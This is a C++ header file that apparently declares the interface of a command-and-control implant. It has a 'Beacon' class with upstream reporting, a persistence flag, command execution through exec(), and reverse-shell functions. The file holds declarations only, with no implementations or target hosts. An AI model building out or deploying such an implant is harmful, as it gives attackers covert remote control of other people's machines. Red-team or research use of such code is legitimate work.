#include <string>
#include <vector>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

typedef std::vector<std::string> ARGS;
class Beacon {
    public:
        Beacon(int id, int port, const char* attached_to, const char *serv_ip_addr);
        bool alive;
        bool persistent;
        const char *get_ip();
        bool establish();
        std::string set_update(int status, std::string cout, bool alive, bool persistent);
        int send_upstream(std::string update);
        void await_update();
        std::string respond(std::string);
    private:
        int id;
        int port;
        const char* attached_to;
        const char* serv_ip;
};

const char *get_ip_addr();

extern int beacon_id, beacon_port, rport;
extern const char * beacon_ip_addr, *serv_ip_addr;

std::string exec(const char *cmd);

int revshell(int);

int rs(ARGS);

bool request_revshell();